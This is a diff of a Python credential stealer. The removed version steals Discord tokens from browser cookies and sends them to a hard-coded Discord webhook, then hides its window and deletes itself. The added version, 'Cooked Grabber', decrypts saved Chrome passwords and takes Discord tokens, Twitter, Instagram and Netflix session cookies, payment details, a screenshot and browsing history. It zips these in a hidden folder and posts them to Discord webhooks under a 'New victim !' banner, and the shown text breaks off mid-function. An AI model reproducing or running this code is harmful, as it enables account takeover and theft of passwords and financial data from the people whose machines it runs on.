@@ -1,421 +1,695 @@
 import os
 import sys
-import requests
-import socket
-import platform
-import getpass
-import json
-import time
-from datetime import datetime
-import subprocess
-import tempfile
-import ctypes
-import threading
-import sqlite3
-import shutil
-import base64
-import winreg
+import win32con
+import browser_cookie3
+from json import loads, dumps
+from base64 import b64decode
+from sqlite3 import connect
+from shutil import copyfile
+from threading import Thread
+from win32crypt import CryptUnprotectData
+from Cryptodome.Cipher import AES
+from discord_webhook import DiscordEmbed, DiscordWebhook
+from subprocess import Popen, PIPE
+from urllib.request import urlopen, Request
+from requests import get
+from re import findall, search
+from win32api import SetFileAttributes, GetSystemMetrics
+from browser_history import get_history
+from prettytable import PrettyTable
+from platform import platform
+from getmac import get_mac_address as gma
+from psutil import virtual_memory
+from collections import defaultdict
+from zipfile import ZipFile, ZIP_DEFLATED
+from cpuinfo import get_cpu_info
+from multiprocessing import freeze_support
+from tempfile import TemporaryDirectory
+from pyautogui import screenshot
+from random import choices
+from string import ascii_letters, digits
 
-# === CONFIGURATION ===
-WEBHOOK_URL = "https://discord.com/api/webhooks/1446737966616547429/tnrCpgYUsP5RjkWocLk_EnQmwjEfEA6vXCPRCtwe80N595UkJRSqF5SZxvNk6ML3tsP6"
-DELETE_AFTER_SEND = True
-SILENT_MODE = True
+website = ["discord.com", "twitter.com", "instagram.com", "netflix.com"]
 
-# Redirect all output to null
-if SILENT_MODE:
-    class NullWriter:
-        def write(self, text):
-            pass
-        def flush(self):
-            pass
-    sys.stdout = NullWriter()
-    sys.stderr = NullWriter()
 
-def get_system_info():
-    """Get basic system info"""
-    try:
-        local_ip = socket.gethostbyname(socket.gethostname())
-    except:
-        local_ip = "Unknown"
-    
-    return {
-        "username": getpass.getuser(),
-        "hostname": socket.gethostname(),
-        "computer_name": os.getenv('COMPUTERNAME', os.getenv('HOSTNAME', 'Unknown')),
-        "local_ip": local_ip,
-        "timestamp": datetime.now().isoformat()
-    }
+def get_screenshot(path):
+    get_screenshot.scrn = screenshot()
+    get_screenshot.scrn_path = os.path.join(
+        path, f"Screenshot_{''.join(choices(list(ascii_letters + digits), k=5))}.png"
+    )
+    get_screenshot.scrn.save(get_screenshot.scrn_path)
 
-def get_public_ip():
-    """Get public IP"""
-    try:
-        response = requests.get('http://checkip.amazonaws.com', timeout=2)
-        if response.status_code == 200:
-            return response.text.strip()
-    except:
-        pass
-    return "Unknown"
 
-def get_master_key():
-    """Get Chrome master key for cookie decryption"""
-    try:
-        # Chrome local state path
-        local_state_path = os.path.join(
-            os.getenv('LOCALAPPDATA'), 
-            'Google', 'Chrome', 'User Data', 'Local State'
-        )
-        
-        if os.path.exists(local_state_path):
-            with open(local_state_path, 'r', encoding='utf-8') as f:
-                local_state = json.load(f)
-            
-            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
-            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
-            
-            # Decrypt with DPAPI
-            class DATA_BLOB(ctypes.Structure):
-                _fields_ = [('cbData', ctypes.wintypes.DWORD),
-                           ('pbData', ctypes.POINTER(ctypes.c_char))]
-            
-            blob = DATA_BLOB()
-            blob.pbData = ctypes.c_char_p(encrypted_key)
-            blob.cbData = len(encrypted_key)
-            
-            out_blob = DATA_BLOB()
-            result = ctypes.windll.crypt32.CryptUnprotectData(
-                ctypes.byref(blob), None, None, None, None, 0, ctypes.byref(out_blob)
-            )
-            
-            if result:
-                decrypted = ctypes.string_at(out_blob.pbData, out_blob.cbData)
-                ctypes.windll.kernel32.LocalFree(out_blob.pbData)
-                return decrypted
-    except:
-        pass
-    return None
+def get_hwid():
+    p = Popen("wmic csproduct get uuid", shell=True, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
 
-def decrypt_chrome_cookie(encrypted_value, master_key):
-    """Decrypt Chrome cookie value"""
-    try:
-        if encrypted_value[:3] == b'v10':
-            iv = encrypted_value[3:15]
-            payload = encrypted_value[15:]
-            
-            from Crypto.Cipher import AES
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted = cipher.decrypt(payload)[:-16]
-            return decrypted.decode('utf-8', errors='ignore')
-    except:
-        pass
-    return None
 
-def get_discord_token_from_browser():
-    """Get Discord token from browser cookies"""
-    tokens = []
-    
-    if platform.system() != "Windows":
-        return tokens
-    
-    # Get master key for decryption
-    master_key = get_master_key()
-    
-    # Chrome paths to check
-    chrome_paths = [
-        os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
-        os.path.join(os.getenv('APPDATA'), 'Google', 'Chrome', 'User Data'),
+def get_user_data(tk):
+    headers = {"Authorization": tk}
+    response = get("https://discordapp.com/api/v6/users/@me", headers=headers).json()
+    return [
+        response["username"],
+        response["discriminator"],
+        response["email"],
+        response["phone"],
     ]
-    
-    for chrome_base in chrome_paths:
-        if not os.path.exists(chrome_base):
-            continue
-        
-        # Check all profiles
-        profiles = []
-        for item in os.listdir(chrome_base):
-            if item == 'Default' or item.startswith('Profile'):
-                profiles.append(item)
-        
-        for profile in profiles:
-            cookies_path = os.path.join(chrome_base, profile, 'Cookies')
-            if not os.path.exists(cookies_path):
-                continue
-            
-            try:
-                # Copy cookies database to temp location
-                temp_db = os.path.join(tempfile.gettempdir(), f'chrome_cookies_{profile}.db')
-                shutil.copy2(cookies_path, temp_db)
-                
-                conn = sqlite3.connect(temp_db)
-                cursor = conn.cursor()
-                
-                # Query Discord cookies
-                cursor.execute("""
-                    SELECT name, encrypted_value 
-                    FROM cookies 
-                    WHERE host_key LIKE '%discord.com%' AND name = 'token'
-                """)
-                
-                for name, encrypted_value in cursor.fetchall():
-                    if encrypted_value:
-                        token = decrypt_chrome_cookie(encrypted_value, master_key)
-                        if token and len(token) > 50:
-                            tokens.append(token)
-                
-                conn.close()
-                os.remove(temp_db)
-                
-            except:
-                continue
-    
-    # Also check Firefox
-    firefox_tokens = get_discord_token_from_firefox()
-    tokens.extend(firefox_tokens)
-    
-    # Remove duplicates
-    return list(set(tokens))
 
-def get_discord_token_from_firefox():
-    """Get Discord token from Firefox"""
-    tokens = []
-    
-    if platform.system() != "Windows":
-        return tokens
-    
-    # Firefox profiles location
-    firefox_base = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
-    if not os.path.exists(firefox_base):
-        return tokens
-    
-    # Find profiles
-    for profile in os.listdir(firefox_base):
-        if profile.endswith('.default-release') or profile.endswith('.default'):
-            cookies_path = os.path.join(firefox_base, profile, 'cookies.sqlite')
-            if not os.path.exists(cookies_path):
-                continue
-            
-            try:
-                temp_db = os.path.join(tempfile.gettempdir(), 'firefox_cookies.db')
-                shutil.copy2(cookies_path, temp_db)
-                
-                conn = sqlite3.connect(temp_db)
-                cursor = conn.cursor()
-                
-                cursor.execute("""
-                    SELECT name, value 
-                    FROM moz_cookies 
-                    WHERE host LIKE '%discord.com%' AND name = 'token'
-                """)
-                
-                for name, value in cursor.fetchall():
-                    if value and len(value) > 50:
-                        tokens.append(value)
-                
-                conn.close()
-                os.remove(temp_db)
-                
-            except:
-                continue
-    
-    return tokens
 
-def test_discord_token(token):
-    """Test if Discord token is valid"""
-    if not token or len(token) < 50:
-        return False
-    
-    headers = {
-        'Authorization': token,
-        'User-Agent': 'Mozilla/5.0'
-    }
+def has_payment_methods(tk):
+    headers = {"Authorization": tk}
+    response = get(
+        "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
+        headers=headers,
+    ).json()
+    return response
+
+
+def cookies_grabber_mod(u):
+    cookies = []
+    browsers = ["chrome", "edge", "firefox", "brave", "opera", "vivaldi", "chromium"]
+    for browser in browsers:
+        try:
+            cookies.append(str(getattr(browser_cookie3, browser)(domain_name=u)))
+        except BaseException:
+            pass
+    return cookies
+
+
+def get_Personal_data():
+    try:
+        ip_address = urlopen(Request("https://api64.ipify.org")).read().decode().strip()
+        country = (
+            urlopen(Request(f"https://ipapi.co/{ip_address}/country_name"))
+            .read()
+            .decode()
+            .strip()
+        )
+        city = (
+            urlopen(Request(f"https://ipapi.co/{ip_address}/city"))
+            .read()
+            .decode()
+            .strip()
+        )
+    except BaseException:
+        city = "City not found -_-"
+        country = "Country not found -_-"
+        ip_address = "No IP found -_-"
+    return [ip_address, country, city]
+
+
+def find_His():
+    """Get browser history with error handling"""
+    table = PrettyTable(padding_width=1)
+    table.field_names = ["CurrentTime", "Link"]
     
     try:
-        response = requests.get('https://discord.com/api/v9/users/@me', 
-                              headers=headers, timeout=3)
-        return response.status_code == 200
-    except:
-        return False
+        # Get history with error handling
+        history_output = get_history()
+        for his in history_output.histories:
+            a, b = his
+            if len(b) <= 100:
+                table.add_row([a, b])
+            else:
+                x_ = b.split("//")
+                if len(x_) > 1:
+                    x__, x___ = x_[1].count("/"), x_[1].split("/")
+                    if x___ and x___[0] != "www.google.com":
+                        if x__ <= 5:
+                            b = f"{x_[0]}//"
+                            for p in x___:
+                                if x___.index(p) != len(x___) - 1:
+                                    b += f"{p}/"
+                            if len(b) <= 100:
+                                table.add_row([a, b])
+                            else:
+                                table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
+                        else:
+                            b = f"{x_[0]}//{x___[0]}/[...]"
+                            if len(b) <= 100:
+                                table.add_row([a, b])
+                            else:
+                                table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
+    except Exception as e:
+        # If history can't be fetched, return empty table
+        print(f"Browser history error: {e}")
+        table.add_row(["Error", "Could not fetch browser history"])
+    
+    return table.get_string()
 
-def get_discord_account_info(token):
-    """Get account info from Discord token"""
-    if not token:
+
+def get_encryption_key():
+    local_state_path = os.path.join(
+        os.environ["USERPROFILE"],
+        "AppData",
+        "Local",
+        "Google",
+        "Chrome",
+        "User Data",
+        "Local State",
+    )
+    if not os.path.exists(local_state_path):
         return None
     
-    headers = {
-        'Authorization': token,
-        'User-Agent': 'Mozilla/5.0'
-    }
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = loads(f.read())
     
     try:
-        response = requests.get('https://discord.com/api/v9/users/@me', 
-                              headers=headers, timeout=3)
-        
-        if response.status_code == 200:
-            user_data = response.json()
-            return {
-                "username": user_data.get('username', 'Unknown'),
-                "discriminator": user_data.get('discriminator', '0000'),
-                "email": user_data.get('email'),
-                "phone": user_data.get('phone'),
-                "verified": user_data.get('verified', False),
-                "mfa_enabled": user_data.get('mfa_enabled', False),
-                "premium_type": user_data.get('premium_type', 0),
-                "token": token
-            }
+        return CryptUnprotectData(
+            b64decode(local_state["os_crypt"]["encrypted_key"])[5:], None, None, None, 0
+        )[1]
     except:
-        pass
-    
-    return None
+        return None
 
-def collect_browser_tokens():
-    """Collect Discord tokens from browser and system info"""
-    system_info = get_system_info()
-    public_ip = get_public_ip()
-    
-    # Get Discord tokens from browser
-    browser_tokens = get_discord_token_from_browser()
-    valid_tokens = []
-    accounts = []
-    
-    # Test each token
-    for token in browser_tokens:
-        if test_discord_token(token):
-            valid_tokens.append(token)
-            account_info = get_discord_account_info(token)
-            if account_info:
-                accounts.append(account_info)
-    
-    # Build data
-    data = {
-        "timestamp": datetime.now().isoformat(),
-        "system": {
-            "username": system_info["username"],
-            "hostname": system_info["hostname"],
-            "computer_name": system_info["computer_name"],
-            "local_ip": system_info["local_ip"]
-        },
-        "network": {
-            "public_ip": public_ip
-        },
-        "discord": {
-            "tokens_found_browser": len(browser_tokens),
-            "valid_tokens": len(valid_tokens),
-            "accounts": accounts
-        }
-    }
-    
-    return data
 
-def send_to_discord(webhook_url, data):
-    """Send data to Discord"""
-    
-    # Create message
-    message = f"""
-**🔐 Discord Token from Browser**
-
-**👤 User:** `{data['system']['username']}`
-**💻 Computer:** `{data['system']['computer_name']}`
-**🌐 Public IP:** `{data['network']['public_ip']}`
-**🔒 Local IP:** `{data['system']['local_ip']}`
-**🕐 Time:** {data['timestamp']}
-
-**📊 Token Stats:**
-• Browser tokens found: {data['discord']['tokens_found_browser']}
-• Valid working tokens: {data['discord']['valid_tokens']}
-"""
-    
-    # Add account info if tokens found
-    if data['discord']['accounts']:
-        for i, account in enumerate(data['discord']['accounts'], 1):
-            message += f"\n**✅ Account {i}:**\n"
-            message += f"```\n"
-            message += f"Token: {account['token']}\n"
-            message += f"User: {account['username']}#{account['discriminator']}\n"
-            if account.get('email'):
-                message += f"Email: {account['email']}\n"
-            if account.get('phone'):
-                message += f"Phone: {account['phone']}\n"
-            message += f"Verified: {'✅' if account['verified'] else '❌'}\n"
-            message += f"MFA: {'✅' if account['mfa_enabled'] else '❌'}\n"
-            message += f"```\n"
-    else:
-        message += "\n**❌ No valid Discord tokens found in browser**\n"
+def decrypt_data(data, key):
+    if not key or not data:
+        return ""
     
     try:
-        # Send message
-        response = requests.post(webhook_url, json={"content": message}, timeout=10)
-        
-        # Send as JSON file too
-        json_str = json.dumps(data, indent=2, ensure_ascii=False)
-        files = {'file': ('browser_tokens.json', json_str.encode('utf-8'), 'application/json')}
-        requests.post(webhook_url, files=files, timeout=10)
-        
-        return True
-    except:
-        return False
-
-def hide_window():
-    """Hide console window"""
-    if platform.system() == "Windows":
+        return (
+            AES.new(
+                CryptUnprotectData(key, None, None, None, 0)[1],
+                AES.MODE_GCM,
+                data[3:15],
+            )
+            .decrypt(data[15:])[:-16]
+            .decode()
+        )
+    except BaseException:
         try:
-            kernel32 = ctypes.WinDLL('kernel32')
-            user32 = ctypes.WinDLL('user32')
-            hwnd = kernel32.GetConsoleWindow()
-            if hwnd:
-                user32.ShowWindow(hwnd, 0)
+            return str(CryptUnprotectData(data, None, None, None, 0)[1])
+        except BaseException:
+            return ""
+
+
+def main(dirpath):
+    db_path = os.path.join(
+        os.environ["USERPROFILE"],
+        "AppData",
+        "Local",
+        "Google",
+        "Chrome",
+        "User Data",
+        "default",
+        "Login Data",
+    )
+    chrome_psw_list = []
+    
+    if os.path.exists(db_path):
+        key = get_encryption_key()
+        if key:
+            filename = os.path.join(dirpath, "ChromeData.db")
+            try:
+                copyfile(db_path, filename)
+                db = connect(filename)
+                cursor = db.cursor()
+                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                
+                for url, user_name, pwd in cursor.fetchall():
+                    pwd_db = decrypt_data(pwd, key)
+                    if pwd_db:
+                        chrome_psw_list.append([user_name, pwd_db, url])
+                
+                cursor.close()
+                db.close()
+            except Exception as e:
+                print(f"Error accessing Chrome passwords: {e}")
+
+    tokens = []
+    cleaned = []
+
+    # FIXED: discord_tokens function with proper error handling
+    def discord_tokens(path):
+        try:
+            local_state_path = os.path.join(path, "Local State")
+            key = None
+            if os.path.exists(local_state_path):
+                with open(local_state_path, "r") as file:
+                    key = loads(file.read())["os_crypt"]["encrypted_key"]
         except:
             pass
 
-def self_delete():
-    """Delete script after execution"""
-    if not DELETE_AFTER_SEND:
-        return
-    
-    try:
-        script_path = os.path.abspath(sys.argv[0])
+        local_storage_path = os.path.join(path, "Local Storage", "leveldb")
         
-        if platform.system() == "Windows":
-            # Simple batch file
-            bat_content = '''@echo off
-timeout /t 1 /nobreak >nul
-del /f /q "{}" >nul 2>&1
-if exist "{}" (
-    timeout /t 1 /nobreak >nul
-    del /f /q "{}" >nul 2>&1
-)
-del "%~f0" >nul 2>&1
-'''.format(script_path, script_path, script_path)
-            
-            bat_path = os.path.join(tempfile.gettempdir(), 'cleanup.bat')
-            with open(bat_path, 'w') as f:
-                f.write(bat_content)
-            
-            subprocess.Popen(['cmd', '/c', bat_path], 
-                           shell=True,
-                           stdin=subprocess.DEVNULL,
-                           stdout=subprocess.DEVNULL,
-                           stderr=subprocess.DEVNULL,
-                           creationflags=subprocess.CREATE_NO_WINDOW)
-    except:
-        pass
+        # Check if the directory exists before trying to list it
+        if not os.path.exists(local_storage_path):
+            return
+        
+        try:
+            for file in os.listdir(local_storage_path):
+                if not (file.endswith(".ldb") or file.endswith(".log")):
+                    continue
+                
+                file_path = os.path.join(local_storage_path, file)
+                try:
+                    with open(file_path, "r", errors="ignore") as files:
+                        content = files.read()
+                        # Look for Discord tokens (updated regex pattern)
+                        found_tokens = findall(r'dQw4w9WgXcQ:[^\"]*', content)
+                        tokens.extend(found_tokens)
+                except:
+                    pass
+        except:
+            pass
 
-def main():
-    """Main function"""
-    hide_window()
+        # Clean the tokens
+        for tkn in tokens:
+            if tkn.endswith("\\"):
+                tkn = tkn.replace("\\", "")
+            if tkn not in cleaned:
+                cleaned.append(tkn)
+
+        # Decrypt tokens if we have a key
+        if key:
+            decrypted_tokens = []
+            for token in cleaned:
+                try:
+                    token_data = token.split("dQw4w9WgXcQ:")
+                    if len(token_data) > 1:
+                        decrypted = decrypt_data(
+                            b64decode(token_data[1]),
+                            b64decode(key)[5:]
+                        )
+                        if decrypted and decrypted not in decrypted_tokens:
+                            decrypted_tokens.append(decrypted)
+                except:
+                    pass
+            tokens.extend(decrypted_tokens)
+
+    local = os.getenv("LOCALAPPDATA")
+    roaming = os.getenv("APPDATA")
     
-    # Collect data from browser
-    data = collect_browser_tokens()
+    # FIXED: Browser paths with proper checking
+    paths = []
+    potential_paths = [
+        os.path.join(roaming, "discord"),
+        os.path.join(roaming, "discordcanary"),
+        os.path.join(roaming, "Lightcord"),
+        os.path.join(roaming, "discordptb"),
+        os.path.join(roaming, "Opera Software", "Opera Stable"),
+        os.path.join(roaming, "Opera Software", "Opera GX Stable"),
+        os.path.join(local, "Amigo", "User Data"),
+        os.path.join(local, "Torch", "User Data"),
+        os.path.join(local, "Kometa", "User Data"),
+        os.path.join(local, "Orbitum", "User Data"),
+        os.path.join(local, "CentBrowser", "User Data"),
+        os.path.join(local, "7Star", "7Star", "User Data"),
+        os.path.join(local, "Sputnik", "Sputnik", "User Data"),
+        os.path.join(local, "Vivaldi", "User Data", "Default"),
+        os.path.join(local, "Google", "Chrome SxS", "User Data"),
+        os.path.join(local, "Google", "Chrome", "User Data", "Default"),
+        os.path.join(local, "Epic Privacy Browser", "User Data"),
+        os.path.join(local, "Microsoft", "Edge", "User Data", "Default"),
+        os.path.join(local, "uCozMedia", "Uran", "User Data", "Default"),
+        os.path.join(local, "Yandex", "YandexBrowser", "User Data", "Default"),
+        os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
+        os.path.join(local, "Iridium", "User Data", "Default"),
+    ]
     
-    # Send to Discord
-    send_to_discord(WEBHOOK_URL, data)
+    # Only add paths that exist
+    for p in potential_paths:
+        if os.path.exists(p):
+            paths.append(p)
+
+    threads = []
+
+    # FIXED: Thread creation with error handling
+    for pth in paths:
+        if os.path.exists(pth):
+            thread = Thread(target=discord_tokens, args=(pth,))
+            threads.append(thread)
     
-    # Self delete
-    if DELETE_AFTER_SEND:
-        threading.Thread(target=self_delete, daemon=True).start()
+    # Start and join threads
+    for t in threads:
+        t.start()
+    
+    for t in threads:
+        t.join()
+
+    # Process other websites
+    t_lst, insta_lst, n_lst = [], [], []
+    
+    for w in website:
+        if w == website[1]:  # twitter.com
+            t_cookies = cookies_grabber_mod(w)
+            for b in t_cookies:
+                cookie_list = b.split(", ")
+                for y in cookie_list:
+                    if search(r"auth_token", y) is not None:
+                        token_val = y.split(" ")[1].split("=")[1]
+                        if token_val not in t_lst:
+                            t_lst.append(token_val)
+        
+        elif w == website[2]:  # instagram.com
+            insta_cookies = cookies_grabber_mod(w)
+            browser_ = defaultdict(dict)
+            for c in insta_cookies:
+                cookie_str = str(c)
+                if (search(r"ds_user_id", cookie_str) is not None and 
+                    search(r"sessionid", cookie_str) is not None):
+                    cookie_items = c.split(", ")
+                    for y in cookie_items:
+                        if search(r"ds_user_id", y):
+                            browser_[insta_cookies.index(c)][0] = y.split("=")[1]
+                        elif search(r"sessionid", y):
+                            browser_[insta_cookies.index(c)][1] = y.split("=")[1]
+            
+            for x in browser_.values():
+                if 0 in x and 1 in x:
+                    insta_lst.append([x[0], x[1]])
+        
+        elif w == website[3]:  # netflix.com
+            n_cookies = cookies_grabber_mod(w)
+            for c in n_cookies:
+                cookie_items = c.split(", ")
+                netflix_cookies = []
+                for y in cookie_items:
+                    if search(r"NetflixId", y) is not None:
+                        data = y.split("=")[1]
+                        if len(data) > 80:
+                            for cookie in cookie_items:
+                                if "=" in cookie:
+                                    name, value = cookie.strip().split("=", 1)
+                                    netflix_cookies.append({
+                                        "domain": website[3],
+                                        "name": name,
+                                        "value": value
+                                    })
+                            if netflix_cookies and netflix_cookies not in n_lst:
+                                n_lst.append(netflix_cookies)
+                            break
+    
+    # Process payment methods
+    all_data_p = []
+    for x in tokens:
+        try:
+            lst_b = has_payment_methods(x)
+            if isinstance(lst_b, list):
+                for n in range(len(lst_b)):
+                    if lst_b[n]["type"] == 1:
+                        writable = [
+                            lst_b[n]["brand"],
+                            lst_b[n]["type"],
+                            lst_b[n]["last_4"],
+                            lst_b[n]["expires_month"],
+                            lst_b[n]["expires_year"],
+                            lst_b[n]["billing_address"],
+                        ]
+                        if writable not in all_data_p:
+                            all_data_p.append(writable)
+                    elif lst_b[n]["type"] == 2:
+                        writable_2 = [
+                            lst_b[n]["email"],
+                            lst_b[n]["type"],
+                            lst_b[n]["billing_address"],
+                        ]
+                        if writable_2 not in all_data_p:
+                            all_data_p.append(writable_2)
+        except BaseException:
+            pass
+    
+    # Return all collected data
+    return [
+        tokens,              # Discord tokens
+        t_lst,               # Twitter tokens
+        insta_lst,           # Instagram tokens  
+        all_data_p,          # Payment methods
+        chrome_psw_list,     # Chrome passwords
+        n_lst                # Netflix cookies
+    ]
+
+
+def send_webhook(DISCORD_WEBHOOK_URLs):
+    p_lst = get_Personal_data()
+    cpuinfo = get_cpu_info()
+    
+    with TemporaryDirectory(dir=".") as td:
+        try:
+            SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
+        except:
+            pass
+        
+        get_screenshot(path=td)
+        main_info = main(td)
+        
+        # Create tables
+        discord_T, twitter_T, insta_T, chrome_Psw_t = (
+            PrettyTable(padding_width=1) for _ in range(4)
+        )
+        discord_T.field_names = ["Discord Tokens", "Username", "Email", "Phone"]
+        twitter_T.field_names = ["Twitter Tokens [auth_token]"]
+        insta_T.field_names = ["ds_user_id", "sessionid"]
+        chrome_Psw_t.field_names = ["Username / Email", "password", "website"]
+        
+        verified_tokens = []
+        
+        # Process Chrome passwords
+        for psw_data in main_info[4]:
+            chrome_Psw_t.add_row(psw_data)
+        
+        # Process Discord tokens
+        discord_tokens_list = main_info[0] if isinstance(main_info[0], list) else []
+        for t_ in discord_tokens_list:
+            try:
+                if t_ and isinstance(t_, str) and len(t_) > 20:
+                    lst = get_user_data(t_)
+                    if lst and len(lst) >= 4:
+                        username = f"{lst[0]}#{lst[1]}"
+                        discord_T.add_row([t_, username, lst[2], lst[3]])
+                        verified_tokens.append(t_)
+            except BaseException as e:
+                # Skip invalid tokens
+                continue
+        
+        # Process Twitter tokens
+        twitter_tokens = main_info[1] if isinstance(main_info[1], list) else []
+        for _t in twitter_tokens:
+            if _t:
+                twitter_T.add_row([_t])
+        
+        # Process Instagram tokens
+        insta_tokens = main_info[2] if isinstance(main_info[2], list) else []
+        for _t_ in insta_tokens:
+            if _t_ and len(_t_) >= 2:
+                insta_T.add_row(_t_)
+        
+        # Process payment info
+        pay_l = []
+        payment_data = main_info[3] if isinstance(main_info[3], list) else []
+        for _p in payment_data:
+            if len(_p) > 1:
+                if _p[1] == 1 and len(_p) >= 6:
+                    payment_card = PrettyTable(padding_width=1)
+                    payment_card.field_names = [
+                        "Brand",
+                        "Last 4",
+                        "Type",
+                        "Expiration",
+                        "Billing Address",
+                    ]
+                    payment_card.add_row(
+                        [_p[0], _p[2], "Debit or Credit Card", f"{_p[3]}/{_p[4]}", _p[5]]
+                    )
+                    pay_l.append(payment_card.get_string())
+                elif _p[1] == 2 and len(_p) >= 3:
+                    payment_p = PrettyTable(padding_width=1)
+                    payment_p.field_names = ["Email", "Type", "Billing Address"]
+                    payment_p.add_row([_p[0], "Paypal", _p[2]])
+                    pay_l.append(payment_p.get_string())
+        
+        # Save data to files
+        files_names = [
+            [os.path.join(td, "Discord Tokens.txt"), discord_T],
+            [os.path.join(td, "Twitter Tokens.txt"), twitter_T],
+            [os.path.join(td, "Instagram Tokens.txt"), insta_T],
+            [os.path.join(td, "Chrome Pass.txt"), chrome_Psw_t],
+        ]
+        
+        for x_, y_ in files_names:
+            should_write = False
+            if y_ == files_names[0][1] and verified_tokens:
+                should_write = True
+            elif y_ == files_names[1][1] and twitter_tokens:
+                should_write = True
+            elif y_ == files_names[2][1] and insta_tokens:
+                should_write = True
+            elif y_ == files_names[3][1] and main_info[4]:
+                should_write = True
+            
+            if should_write:
+                try:
+                    with open(x_, "w", encoding='utf-8') as wr:
+                        wr.write(y_.get_string())
+                except Exception as e:
+                    print(f"Error writing {x_}: {e}")
+        
+        # Prepare files for zipping
+        all_files = [
+            os.path.join(td, "History.txt"),
+            get_screenshot.scrn_path,
+        ]
+        
+        # Add payment info file if we have payment data
+        if pay_l:
+            payment_file = os.path.join(td, "Payment Info.txt")
+            try:
+                with open(payment_file, "w", encoding='utf-8') as f:
+                    for i in pay_l:
+                        f.write(f"{i}\n")
+                all_files.append(payment_file)
+            except Exception as e:
+                print(f"Error writing payment info: {e}")
+        
+        # Add Netflix cookies
+        netflix_data = main_info[5] if isinstance(main_info[5], list) else []
+        for n in netflix_data:
+            try:
+                p = os.path.join(td, f"netflix_{netflix_data.index(n)}.json")
+                with open(p, "w", encoding='utf-8') as f:
+                    f.write(dumps(n, indent=4))
+                all_files.append(p)
+            except Exception as e:
+                print(f"Error writing Netflix data: {e}")
+        
+        # Save browser history (with error handling)
+        try:
+            history_content = find_His()
+            with open(all_files[0], "w", encoding='utf-8') as f:
+                f.write(history_content)
+        except Exception as e:
+            print(f"Error saving history: {e}")
+            # Create empty history file if there's an error
+            with open(all_files[0], "w", encoding='utf-8') as f:
+                f.write("Could not retrieve browser history\n")
+        
+        # Create ZIP file
+        zip_path = os.path.join(td, "data.zip")
+        try:
+            with ZipFile(zip_path, mode="w", compression=ZIP_DEFLATED) as zipf:
+                for files_path in all_files:
+                    if os.path.exists(files_path):
+                        zipf.write(files_path, os.path.basename(files_path))
+                
+                for name_f, _ in files_names:
+                    if os.path.exists(name_f):
+                        zipf.write(name_f, os.path.basename(name_f))
+        except Exception as e:
+            print(f"Error creating ZIP file: {e}")
+            return
+        
+        # Send to Discord webhooks
+        for URL in DISCORD_WEBHOOK_URLs:
+            try:
+                webhook = DiscordWebhook(
+                    url=URL,
+                    username="Cooked Grabber",
+                    avatar_url="https://i.postimg.cc/FRdZ5DJV/discord-avatar-128-ABF2-E.png",
+                    rate_limit_retry=True
+                )
+                
+                embed = DiscordEmbed(title="New victim !", color="FFA500")
+                
+                # System info
+                pc_username = os.getenv('UserName', 'Unknown')
+                pc_name = os.getenv('COMPUTERNAME', 'Unknown')
+                os_info = platform()
+                
+                embed.add_embed_field(
+                    name="SYSTEM USER INFO",
+                    value=f":pushpin:`PC Username:` **{pc_username}**\n:computer:`PC Name:` **{pc_name}**\n:globe_with_meridians:`OS:` **{os_info}**\n",
+                    inline=False,
+                )
+                
+                # IP info
+                mac_address = gma()
+                if not mac_address or mac_address == "00:00:00:00:00:00":
+                    mac_address = "Not available"
+                
+                embed.add_embed_field(
+                    name="IP USER INFO",
+                    value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}**\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{mac_address}**\n:wrench:`HWID:` **{get_hwid()}**\n",
+                    inline=False,
+                )
+                
+                # Hardware info
+                cpu_brand = cpuinfo.get('brand_raw', 'Unknown')
+                cpu_speed = "Unknown"
+                if 'hz_advertised_friendly' in cpuinfo:
+                    try:
+                        cpu_speed = f"{round(float(str(cpuinfo['hz_advertised_friendly']).split(' ')[0]), 2)} GHz"
+                    except:
+                        cpu_speed = "Unknown"
+                
+                ram_gb = round(virtual_memory().total / (1024.0 ** 3), 2)
+                resolution = f"{GetSystemMetrics(0)}x{GetSystemMetrics(1)}"
+                
+                embed.add_embed_field(
+                    name="PC USER COMPONENT",
+                    value=f":satellite_orbital:`CPU:` **{cpu_brand} - {cpu_speed}**\n:nut_and_bolt:`RAM:` **{ram_gb} GB**\n:desktop:`Resolution:` **{resolution}**\n",
+                    inline=False,
+                )
+                
+                # Account stats
+                discord_count = len(verified_tokens)
+                twitter_count = len(twitter_tokens)
+                insta_count = len(insta_tokens)
+                netflix_count = len(netflix_data)
+                password_count = len(main_info[4])
+                
+                embed.add_embed_field(
+                    name="ACCOUNT GRABBED",
+                    value=f":red_circle:`Discord:` **{discord_count}**\n:purple_circle:`Twitter:` **{twitter_count}**\n:blue_circle:`Instagram:` **{insta_count}**\n:green_circle:`Netflix:` **{netflix_count}**\n:brown_circle:`Account Password Grabbed:` **{password_count}**\n",
+                    inline=False,
+                )
+                
+                # Payment info
+                has_card = any("Debit or Credit Card" in p for p in pay_l)
+                has_paypal = any("Paypal" in p for p in pay_l)
+                
+                card_e = ":white_check_mark:" if has_card else ":x:"
+                paypal_e = ":white_check_mark:" if has_paypal else ":x:"
+                
+                embed.add_embed_field(
+                    name="PAYMENT INFO FOUNDED",
+                    value=f":credit_card:`Debit or Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}",
+                    inline=False,
+                )
+                
+                embed.set_footer(text="By Lemon.-_-.#3714 & 0xSpoofed")
+                embed.set_timestamp()
+                
+                # Add ZIP file
+                try:
+                    with open(zip_path, "rb") as f:
+                        zip_data = f.read()
+                        if zip_data:
+                            webhook.add_file(
+                                file=zip_data,
+                                filename=f"Cooked-Grabber-{pc_username}.zip",
+                            )
+                except Exception as e:
+                    print(f"Error reading ZIP file: {e}")
+                
+                webhook.add_embed(embed)
+                response = webhook.execute()
+                
